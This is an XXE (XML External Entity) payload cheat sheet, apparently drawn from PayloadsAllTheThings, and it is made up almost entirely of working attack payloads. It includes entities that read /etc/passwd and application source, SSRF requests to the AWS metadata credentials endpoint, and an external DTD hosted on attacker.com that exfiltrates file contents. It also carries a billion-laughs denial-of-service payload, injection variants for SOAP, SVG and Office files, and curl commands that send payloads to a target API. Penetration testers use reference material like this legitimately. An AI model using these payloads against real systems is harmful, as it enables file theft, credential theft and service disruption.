# XXE (XML External Entity) Payloads

> Source: PayloadsAllTheThings — XXE Injection

## Classic XXE — File Read

### Linux

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Windows

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>
```

### PHP Source Code (Base64)

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<foo>&xxe;</foo>
```

## SSRF via XXE

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt">
]>
<foo>&xxe;</foo>
```

```xml
<!-- AWS metadata -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

## Blind XXE — Out-of-Band (OOB)

### Detection via HTTP Callback

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://attacker.com/xxe-canary">
  %ext;
]>
<root></root>
```

### Data Exfiltration via External DTD

**Malicious XML:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
  %ext;
  %eval;
  %exfil;
]>
<root></root>
```

**ext.dtd hosted on attacker server:**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
```

## Error-Based XXE

Using local DTD file override (Linux — `/usr/share/xml/fontconfig/fonts.dtd`):

```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
<message>text</message>
```

## XXE Denial of Service (Billion Laughs)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY a0 "dos">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

## XXE in Different Contexts

### SOAP

```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

### SVG Image Upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX / XLSX (Office Documents)

Unzip the document, inject XXE into `word/document.xml` or `xl/workbook.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ENTITY % asd SYSTEM "http://attacker.com/ext.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
```

Re-zip and upload.

### Content-Type Switching

Change `Content-Type: application/json` to `Content-Type: application/xml` and send:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>
```

## Useful curl Examples

```bash
# Basic XXE test
run_tool curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' http://target/api

# Blind XXE detection
run_tool curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % ext SYSTEM "http://attacker.com/canary">%ext;]><foo>test</foo>' http://target/api
```
